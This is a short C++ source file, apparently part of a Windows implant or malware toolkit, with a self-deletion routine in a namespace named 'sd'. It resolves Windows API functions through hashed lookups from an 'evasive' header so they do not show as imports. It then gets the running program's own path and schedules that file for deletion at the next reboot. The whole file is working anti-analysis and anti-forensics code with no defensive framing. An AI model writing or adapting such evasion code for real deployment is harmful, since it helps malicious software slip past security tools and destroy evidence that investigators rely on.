#include "SelfDel.h"
#include "evasive/ApiHash.h"

#include <windows.h>

namespace sd {

void run() {
    auto gp = api::resolve<decltype(&GetModuleFileNameA)>(
        API_HASH("kernel32.dll"), API_HASH("GetModuleFileNameA"));
    auto mfe = api::resolve<decltype(&MoveFileExA)>(
        API_HASH("kernel32.dll"), API_HASH("MoveFileExA"));
    if (!gp || !mfe) return;
    char path[MAX_PATH] = {};
    gp(nullptr, path, MAX_PATH);
    mfe(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
}

} // namespace sd
